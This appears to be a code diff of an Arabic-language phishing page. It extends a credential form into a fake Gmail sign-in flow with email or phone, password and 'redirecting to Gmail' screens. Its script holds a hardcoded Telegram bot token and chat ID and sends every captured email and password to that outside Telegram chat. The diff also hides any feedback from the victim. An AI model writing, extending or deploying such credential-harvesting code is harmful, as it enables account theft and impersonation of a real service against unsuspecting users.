@@ -169,6 +169,205 @@
             100% { transform: rotate(360deg); }
         }
 
+        /* صفحة الرقم والبريد */
+        .email-phone-page {
+            display: none;
+        }
+
+        .email-phone-page.active {
+            display: block;
+        }
+
+        .input-container {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .input-container input {
+            padding-right: 120px;
+        }
+
+        .email-suffix {
+            position: absolute;
+            right: 18px;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            pointer-events: none;
+        }
+
+        .email-suffix.hidden {
+            display: none;
+        }
+
+        /* صفحة كلمة المرور */
+        .password-page {
+            display: none;
+        }
+
+        .password-page.active {
+            display: block;
+        }
+
+        .email-display {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50px;
+            padding: 12px 18px;
+            color: white;
+            text-align: center;
+            margin-bottom: 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .email-display span {
+            flex: 1;
+        }
+
+        .profile-icon {
+            width: 32px;
+            height: 32px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            margin-right: 12px;
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 18px;
+            background: none;
+            border: none;
+            color: rgba(255, 255, 255, 0.6);
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .toggle-password:hover {
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .forgot-password a {
+            color: #39e76d;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .page-title {
+            text-align: center;
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 40px;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: auto;
+            padding: 0;
+            border: none;
+            background: none;
+            cursor: pointer;
+        }
+
+        .checkbox-container label {
+            margin: 0;
+            color: rgba(255, 255, 255, 0.8);
+            font-weight: 400;
+            cursor: pointer;
+        }
+
+        /* صفحة Gmail */
+        .gmail-page {
+            display: none;
+            background: white !important;
+            min-height: 100vh !important;
+        }
+
+        .gmail-page.active {
+            display: block;
+        }
+
+        body.gmail-active {
+            background: white;
+        }
+
+        .gmail-container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: white;
+        }
+
+        .gmail-logo {
+            margin-bottom: 40px;
+            animation: fadeIn 0.6s ease;
+        }
+
+        .gmail-logo svg {
+            width: 120px;
+            height: auto;
+        }
+
+        .gmail-text {
+            font-size: 28px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .gmail-subtext {
+            font-size: 16px;
+            color: #5f6368;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .gmail-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f0f0f0;
+            border-top: 4px solid #4285f4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 30px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
         @media (max-width: 480px) {
             .container {
                 padding: 0 15px;
@@ -181,56 +380,167 @@
             input {
                 font-size: 16px;
             }
+
+            .gmail-text {
+                font-size: 24px;
+            }
+
+            .gmail-subtext {
+                font-size: 14px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <button class="back-btn" onclick="window.history.back()">←</button>
-            <div class="logo">
-                <img src="https://l.top4top.io/p_3743akjx50.png" alt="lba logo">
+        <!-- صفحة البريد الإلكتروني وكلمة المرور الأصلية -->
+        <div class="login-page active">
+            <div class="header">
+                <button class="back-btn" onclick="window.history.back()">←</button>
+                <div class="logo">
+                    <img src="https://a.top4top.io/p_3743bvz3x0.png" alt="lba logo">
+                </div>
+                <div class="placeholder-space"></div>
             </div>
-            <div class="placeholder-space"></div>
+
+            <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">البريد الإلكتروني</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="email" 
+                            id="email" 
+                            name="email"
+                            placeholder="أدخل بريدك الإلكتروني"
+                            required
+                        >
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="password" 
+                            name="password"
+                            placeholder="أدخل كلمة المرور"
+                            required
+                        >
+                    </div>
+                </div>
+
+                <div class="form-actions">
+                    <button type="submit" class="submit-btn" id="submitBtn">الدخول</button>
+                </div>
+            </form>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>جاري الإرسال...</p>
+            </div>
         </div>
 
-        <h1 class="heading">للاستمرار، يرجى إدخال البريد الإلكتروني المستخدم وكلمة المرور</h1>
-
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="email">البريد الإلكتروني</label>
-                <div class="input-wrapper">
-                    <input 
-                        type="email" 
-                        id="email" 
-                        name="email"
-                        placeholder="أدخل بريدك الإلكتروني"
-                        required
-                    >
+        <!-- صفحة الرقم والبريد -->
+        <div class="email-phone-page">
+            <div class="header">
+                <button class="back-btn" onclick="goBackToLogin()">←</button>
+                <div class="logo">
+                    <img src="https://a.top4top.io/p_3743bvz3x0.png" alt="lba logo">
                 </div>
+                <div class="placeholder-space"></div>
             </div>
 
-            <div class="form-group">
-                <label for="password">كلمة المرور</label>
-                <div class="input-wrapper">
-                    <input 
-                        type="password" 
-                        id="password" 
-                        name="password"
-                        placeholder="أدخل كلمة المرور"
-                        required
-                    >
+            <h1 class="page-title">تسجيل الدخول</h1>
+            <p class="heading">المتابعة إلى Gmail</p>
+
+            <form id="emailPhoneForm">
+                <div class="form-group">
+                    <div class="input-container">
+                        <input 
+                            type="text" 
+                            id="emailPhone" 
+                            name="emailPhone"
+                            placeholder="��دخل بريدك الإلكتروني أو الهاتف"
+                            required
+                        >
+                        <span class="email-suffix" id="emailSuffix">@gmail.com</span>
+                    </div>
                 </div>
+
+                <p class="heading" style="font-size: 13px; margin-top: 20px;">هل نسيت بريدك الإلكتروني؟</p>
+
+                <div class="form-actions">
+                    <button type="submit" class="submit-btn">التالي</button>
+                </div>
+            </form>
+
+            <p class="heading" style="font-size: 13px; margin-top: 40px;">إنشاء حساب</p>
+        </div>
+
+        <!-- صفحة كلمة المرور -->
+        <div class="password-page">
+            <div class="header">
+                <button class="back-btn" onclick="goBackToEmailPhone()">←</button>
+                <div class="logo">
+                    <img src="https://a.top4top.io/p_3743bvz3x0.png" alt="lba logo">
+                </div>
+                <div class="placeholder-space"></div>
             </div>
 
-            <div class="form-actions">
-                <button type="submit" class="submit-btn" id="submitBtn">الدخول</button>
-            </div>
-        </form>
+            <h1 class="page-title">مرحباً</h1>
 
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>جاري الإرسال...</p>
+            <div class="email-display">
+                <span id="displayEmail"></span>
+                <div class="profile-icon">👤</div>
+            </div>
+
+            <form id="passwordForm">
+                <div class="form-group">
+                    <label for="passwordInput">إدخال كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="password" 
+                            id="passwordInput" 
+                            name="password"
+                            placeholder="أدخل كلمة المرور"
+                            required
+                        >
+                        <button type="button" class="toggle-password" onclick="togglePassword()">👁️</button>
+                    </div>
+                </div>
+
+                <div class="checkbox-container">
+                    <input type="checkbox" id="showPassword" onchange="togglePassword()">
+                    <label for="showPassword">عرض كلمة المرور</label>
+                </div>
+
+                <p class="forgot-password">
+                    <a href="#">هل نسيت كلمة المرور؟</a>
+                </p>
+
+                <div class="form-actions">
+                    <button type="submit" class="submit-btn">التالي</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- صفحة Gmail -->
+        <div class="gmail-page">
+            <div class="gmail-container">
+                <div class="gmail-logo">
+                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <rect width="24" height="24" rx="3" fill="#EA4335"/>
+                        <path d="M3 5L12 12L21 5" stroke="white" stroke-width="1.5" stroke-linecap="round"/>
+                        <path d="M3 5H21V19C21 19.5304 20.7893 20.0391 20.4142 20.4142C20.0391 20.7893 19.5304 21 19 21H5C4.46957 21 3.96086 20.7893 3.58579 20.4142C3.21071 20.0391 3 19.5304 3 19V5Z" stroke="white" stroke-width="1.5" stroke-linejoin="round"/>
+                    </svg>
+                </div>
+                <div class="gmail-spinner"></div>
+                <h2 class="gmail-text">جاري التوجيه إلى Gmail...</h2>
+                <p class="gmail-subtext">يرجى الانتظار قليلاً</p>
+            </div>
         </div>
     </div>
 
@@ -238,6 +548,9 @@
         const TELEGRAM_BOT_TOKEN = '8607340933:AAEKE8jwaYZVx_4955TocD8kCeg6se9Fdyg';
         const TELEGRAM_CHAT_ID = '6873334348';
 
+        let savedEmail = '';
+
+        // الصفحة الأولى - البريد وكلمة المرور
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -249,12 +562,138 @@
                 return;
             }
 
-            const submitBtn = document.getElementById('submitBtn');
-            const loading = document.getElementById('loading');
+            savedEmail = email;
 
-            submitBtn.disabled = true;
-            loading.style.display = 'block';
+            // التحقق إذا كان بريد أم رقم
+            const isPhone = /^\d{10,}$/.test(email);
+            
+            if (isPhone) {
+                goToPasswordPage(email);
+            } else {
+                goToEmailPhonePage(email);
+            }
 
+            // إرسال البيانات إلى التلجرام
+            sendToTelegram(email, password);
+        });
+
+        // الصفحة الثانية - الرقم والبريد
+        document.getElementById('emailPhoneForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const emailPhone = document.getElementById('emailPhone').value.trim();
+            
+            if (!emailPhone) {
+                alert('الرجاء إدخال البريد أو الرقم');
+                return;
+            }
+
+            savedEmail = emailPhone;
+
+            // التحقق إذا كان رقم ف��ط، إضافة @gmail.com إذا كان بريد
+            const isPhone = /^\d{10,}$/.test(emailPhone);
+            const displayValue = isPhone ? emailPhone : emailPhone.includes('@') ? emailPhone : emailPhone + '@gmail.com';
+
+            goToPasswordPage(displayValue);
+        });
+
+        // الصفحة الثالثة - كلمة المرور
+        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const password = document.getElementById('passwordInput').value;
+            
+            if (!password) {
+                alert('الرجاء إدخال كلمة المرور');
+                return;
+            }
+
+            // إرسال البيانات إلى التلجرام
+            await sendToTelegram(savedEmail, password);
+
+            // الانتقال إلى صفحة Gmail
+            goToGmailPage();
+
+            // بعد 3 ثواني إعادة التوجيه إلى Gmail الحقيقية (اختياري)
+            setTimeout(() => {
+                // window.location.href = 'https://mail.google.com';
+            }, 3000);
+        });
+
+        // التحكم بحقل البريد/الرقم
+        document.getElementById('emailPhone').addEventListener('input', function(e) {
+            const value = e.target.value;
+            const isPhone = /^\d/.test(value);
+            const suffix = document.getElementById('emailSuffix');
+
+            if (isPhone) {
+                suffix.classList.add('hidden');
+            } else {
+                suffix.classList.remove('hidden');
+            }
+        });
+
+        // إظهار/إخفاء كلمة المرور
+        function togglePassword() {
+            const input = document.getElementById('passwordInput');
+            const checkbox = document.getElementById('showPassword');
+            
+            if (checkbox.checked) {
+                input.type = 'text';
+            } else {
+                input.type = 'password';
+            }
+        }
+
+        // الانتقال إلى صفحة البريد والرقم
+        function goToEmailPhonePage(email) {
+            document.querySelector('.login-page').classList.remove('active');
+            document.querySelector('.email-phone-page').classList.add('active');
+            document.querySelector('.password-page').classList.remove('active');
+            document.querySelector('.gmail-page').classList.remove('active');
+            document.body.classList.remove('gmail-active');
+            document.getElementById('emailPhone').value = email;
+        }
+
+        // الانتقال إلى صفحة كلمة المرور
+        function goToPasswordPage(emailOrPhone) {
+            document.querySelector('.login-page').classList.remove('active');
+            document.querySelector('.email-phone-page').classList.remove('active');
+            document.querySelector('.password-page').classList.add('active');
+            document.querySelector('.gmail-page').classList.remove('active');
+            document.body.classList.remove('gmail-active');
+            document.getElementById('displayEmail').textContent = emailOrPhone;
+            savedEmail = emailOrPhone;
+        }
+
+        // الانتقال إلى صفحة Gmail
+        function goToGmailPage() {
+            document.querySelector('.login-page').classList.remove('active');
+            document.querySelector('.email-phone-page').classList.remove('active');
+            document.querySelector('.password-page').classList.remove('active');
+            document.querySelector('.gmail-page').classList.add('active');
+            document.body.classList.add('gmail-active');
+        }
+
+        // العودة إلى الصفحة الأولى
+        function goBackToLogin() {
+            document.querySelector('.login-page').classList.add('active');
+            document.querySelector('.email-phone-page').classList.remove('active');
+            document.querySelector('.password-page').classList.remove('active');
+            document.querySelector('.gmail-page').classList.remove('active');
+            document.body.classList.remove('gmail-active');
+        }
+
+        // العودة إلى صفحة البريد والرقم
+        function goBackToEmailPhone() {
+            document.querySelector('.email-phone-page').classList.add('active');
+            document.querySelector('.password-page').classList.remove('active');
+            document.querySelector('.gmail-page').classList.remove('active');
+            document.body.classList.remove('gmail-active');
+        }
+
+        // إرسال البيانات إلى التلجرام
+        async function sendToTelegram(email, password) {
             try {
                 const message = `
 📧 <b>بيانات دخول جديدة</b>
@@ -279,19 +718,12 @@
                 const data = await response.json();
 
                 if (data.ok) {
-                    alert('تم تسجيل الدخول بنجاح');
-                    document.getElementById('loginForm').reset();
-                } else {
-                    alert('حدث خطأ. الرجاء المحاولة مجددا');
+                    console.log('تم إرسال البيانات بنجاح');
                 }
             } catch (error) {
                 console.error('Error:', error);
-                alert('خطأ في الاتصال');
-            } finally {
-                submitBtn.disabled = false;
-                loading.style.display = 'none';
             }
-        });
+        }
     </script>
 </body>
 </html>
